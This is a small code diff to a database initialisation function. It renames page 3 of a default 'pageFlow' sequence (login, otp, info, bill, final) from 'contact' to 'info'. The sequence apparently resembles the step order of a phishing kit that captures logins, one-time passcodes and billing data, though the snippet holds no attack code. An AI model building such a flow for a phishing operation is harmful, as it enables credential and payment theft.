@@ -50,7 +50,7 @@ export async function initDB() {
         pageFlow TEXT NOT NULL DEFAULT '{
 		  "1": { "page": "login", "enabled": true },
 		  "2": { "page": "otp", "enabled": true },
-		  "3": { "page": "contact", "enabled": false },
+		  "3": { "page": "info", "enabled": false },
 		  "4": { "page": "bill", "enabled": true },
 		  "5": { "page": "final", "enabled": true }
 		}'
